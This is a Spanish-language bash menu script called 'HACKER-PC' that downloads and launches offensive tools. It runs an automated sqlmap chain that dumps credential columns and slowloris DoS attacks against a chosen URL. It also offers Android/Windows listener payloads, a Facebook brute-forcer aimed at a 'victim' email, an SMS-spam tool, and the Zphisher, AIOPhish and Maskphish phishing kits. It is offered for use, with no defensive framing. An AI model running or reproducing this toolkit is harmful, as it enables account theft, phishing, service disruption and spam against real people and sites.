#!/bin/bash

#Politica y Privicidad »»»» HACKER-PC
verde='\e[1;32m'
cyan='\e[1;36m'
rojo='\e[1;31m'
azul='\e[1;34m'
blanco='\e[1;35m'
amarillo='\e[1;33m'
click='\e[5m'
fn='\e[25m'
fnc='\e[0;0m'
mor='\e[95m'
negrita="\e[1m"
clear
function limpiar_pantalla {
    clear
}
limpiar_pantalla
while :
do
opcion=0
echo
echo
echo -e "
$blanco  ===============================  $azul    ██▓     ██▓ ███▄    █  █    ██ ▒██   ██▒
  =  ====  ================  ====  $azul   ▓██▒    ▓██▒ ██ ▀█   █  ██  ▓██▒▒▒ █ █ ▒░
  =  ====  ================  ====  $azul   ▒██░    ▒██▒▓██  ▀█ ██▒▓██  ▒██░░░  █   ░
  =  ====  ================  ====  $azul   ▒██░    ░██░▓██▒  ▐▌██▒▓▓█  ░██░ ░ █ █ ▒ 
  =  ====  ===   ====   ===  =  =  $azul   ░██████▒░██░▒██░   ▓██░▒▒█████▓ ▒██▒ ▒██▒
  =        ==  =  ==  =  ==    ==  $rojo   ░ ▒░▓  ░░▓  ░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒▒ ░ ░▓ ░
  =  ====  =====  ==  =====   ===  $rojo   ░ ░ ▒  ░ ▒ ░░ ░░   ░ ▒░░░▒░ ░ ░ ░░   ░▒ ░
  =  ====  ===    ==  =====    ==  $rojo     ░ ░    ▒ ░   ░   ░ ░  ░░░ ░ ░  ░    ░  
  =  ====  ==  =  ==  =  ==  =  =  $rojo       ░  ░ ░           ░    ░      ░    ░  
  =  ====  ===    ===   ===  =  =  $rojo                                            $fnc
$blanco  ===============================$fnc                   "                          

echo
echo

echo -e "  \e[0;34m 01 \e[31mNmap\e[0;34m"              " Simple comando NMAP "
echo -e "  \e[0;34m 02 \e[31mSqlmap\e[0;34m"            " SQLmap automatizado ... "
echo -e "  \e[0;34m 03 \e[31mDdoS-slowloris.pl\e[0;34m" " ataques Dos efectivos y configurado ... "
echo -e "  \e[0;34m 04 \e[31mPayload-s\e[0;34m"         " Payload windows, android[modo escucha ] ... "
echo -e "  \e[0;34m 05 \e[31mXSSTRIKE\e[0;34m"          " XSStrike un potente scan de vulnerabilidades  ... "
echo -e "  \e[0;34m 06 \e[31mGross-fb\e[0;34m"          " Un script que te ayudara a  Crackear cuentas de facebook ... "
echo -e "  \e[0;34m 07 \e[31mGOOD-KILLER\e[0;34m"       " Herramienta que envia sms-spam 1 SmS por dia ... "
echo -e "  \e[0;34m 08 \e[31mZphisher\e[0;34m"          " zphisher script profecional para phishing ... "
echo -e "  \e[0;34m 09 \e[31mAIOPhish\e[0;34m"          " aiophish un completo script para phishing ... "
echo -e "  \e[0;34m 10 \e[31mMaskphish\e[0;34m"         " Acortador de link, o phishing "
echo -e "  \e[0;34m 99 \e[31m\e[5mAtras\n\e[25m"

echo -e -n "\e[32m  Ingrese un valor :> "
read opcion
case $opcion in

1)
function limpiar_pantalla {
    clear
}
trap ctrl_c INT
function ctrl_c() {
    echo -e "\e[0;31m SALIENDO DEL SCRIPT\e[0m"
    sleep 2s
    limpiar_pantalla
    exit 0
}
nmap
echo
echo
echo
echo "ESTE PROCESO PUEDE TARDAR POR EL ESCANEO  ..."
echo
echo
echo
read -p "INGRESE SU IP O PAGINA WEB > " v
nmap -sV --script vulners $v
read enterkey
;;
2)
function limpiar_pantalla {
    clear
}
trap ctrl_c INT
function ctrl_c() {
    echo -e "\e[0;31m SALIENDO DEL SCRIPT\e[0m"
    sleep 2s
    limpiar_pantalla
    exit 0
    echo "volviendo al menu "
    bash Hacker-pc.sh
}
sqlmap
echo -e "secuencia sqlmap\n"
echo
read -p "Citio web, IP > " o
sqlmap -u "$o" --random-agent --current-db --level=5 --dbms=Mysql 
echo
read -p "Enter dbs > " s
sqlmap -u $o --random-agent --level=5 --dbms=Mysql -D $s --tables
echo
read -p "your user > " e
sqlmap -u $o --random-agent --level=5 --dbms=Mysql -D $s  -T $e --columns
echo
read -p "set pass   > " pass
read -p "set usr"
sqlmap -u $o --random-agent --level=5 --dbms=Mysql -D $s  -T $e -C $pass,$usr --dump
read enterkey
;;
3)
function limpiar_pantalla {
    clear    
}

trap ctrl_c INT
function ctrl_c() {
    echo -e "\e[0;31m SALIENDO DEL SCRIPT\e[0m"
    sleep 2s
    limpiar_pantalla
    exit 0
    bash Hacker-pc.sh
    echo "volviendo al menu "
}


for slowloris in output
do
cd ..
cd output
limpiar_pantalla
git clone https://github.com/Ogglas/Orignal-Slowloris-HTTP-DoS.git
limpiar_pantalla
chmod 777 -R Orignal-Slowloris-HTTP-DoS
cd Orignal-Slowloris-HTTP-DoS
perl slowloris.pl
echo -e "    \e[0;34m\e[5mCrack ingresa la URL a atacar\e[25m"
read url
echo -e "    \e[0;34m\e[5mPuerto\e[25m"
read p
echo -e "    \e[0;34m\e[5mTimeout\e[25m"
read t
limpiar_pantalla
echo -e "                    \e[0;34m\e[5mCAGANDONOS EN LA PUTA MADRE CRACK\e[25m "
sleep 3
perl slowloris.pl -dns $url -port $p -timeout -num $t -cache
done
read enterkey
;;
4)
cd ..
cd output
cd android
chmod 777 -R android.sh
bash android.sh
read enterkey
;;
5)
function limpiar {
    clear
}
trap ctrl_c INT
function ctrl_c() {
    echo -e "\e[0;31m SALIENDO DEL SCRIPT\e[0m"
    sleep 2s
    limpiar_pantalla
    exit 0
}

for XSStrike in output
do
function limpiar_pantalla {
    clear
}
cd ..
cd output
limpiar_pantalla
git clone https://github.com/s0md3v/XSStrike.git
chmod 777 -R XSStrike
limpiar_pantalla
cd XSStrike
python3 xsstrike.py
echo -e "comandos a agregar para el escaneo " URL
read url
python3 xsstrike.py $URL
done
read enterkey
;;
6)
trap ctrl_c INT
function ctrl_c() {
    echo -e "\e[0;31m SALIENDO DEL SCRIPT\e[0m"
    sleep 2s
    limpiar_pantalla
    exit 0
    echo "volviendo al menu "
}
for Grossfb in output
do
function limpiar_pantalla {
    clear
}
cd ..
cd output
limpiar_pantalla
git clone https://github.com/Antraxmx/Gross-FB.git
chmod 777 -R Gross-FB
limpiar_pantalla
cd Gross-FB
limpiar_pantalla
echo -e "   \e[0;31m\e[5mCrackPress enter \e[0m"
echo -e "  \e[0;34mIngresa correo dela victima"
read c
echo -e "  \e[0;34mIngresa ruta de tu diccionario"
read d
perl gross.pl $c $d
done
read enterkey
;;
7)
function limpiar_pantalla {
    clear    
}

trap ctrl_c INT
function ctrl_c() {
    echo -e "\e[0;31m SALIENDO DEL SCRIPT\e[0m"
    sleep 2s
    limpiar_pantalla
    exit 0
    bash Hacker-pc.sh
    echo "volviendo al menu "
}


for Goodkiller in output
do
cd ..
cd output
limpiar_pantalla
git clone https://github.com/FDX100/GOD-KILLER.git
chmod 777 -R GOD-KILLER
limpiar_pantalla
cd GOD-KILLER
chmod 777 -R install.py
python install.py "
y"
GOD-KILLER
done
read enterkey
;;
8)
trap ctrl_c INT
function ctrl_c() {
    echo -e "\e[0;31m SALIENDO DEL SCRIPT\e[0m"
    sleep 2s
    limpiar_pantalla
    exit 0
}
for Zphisher in output
do
function limpiar_pantalla {
    clear
}
cd ..
cd output
printf " INICIANDO INSTALACION DE REQUERIMENTOS " "                                                                                                   "
apt install git curl php wget -y
printf "INSTALADAS CON EXITO"
limpiar_pantalla
git clone git://github.com/htr-tech/zphisher.git
chmod 777 -R zphisher
limpiar_pantalla
cd zphisher
bash zphisher.sh
done
read enterkey
;;
9)
trap ctrl_c INT
function ctrl_c() {
    echo -e "\e[0;31m SALIENDO DEL SCRIPT\e[0m"
    sleep 2s
    limpiar_pantalla
    exit 0
}
for AIOPhish in output
do
function limpiar_pantalla {
    clear
}
cd ..
cd output
limpiar_pantalla
git clone https://github.com/DeepSociety/AIOPhish
chmod 777 -R AIOPhish
limpiar_pantalla
cd AIOPhish
./aiophish
done
read enterkey
;;
10)
function maskphish {
    cd ..
    cd output
    git clone https://github.com/jaykali/maskphish
    cd maskphish
    bash maskphish.sh
}
maskphish
read enterkey
;;
99)
clear
cd ..
cd hack
bash main.sh
read enterkey
;;
*) echo "la opcion no esta en la lista"
read enterkey
;;
esac
done
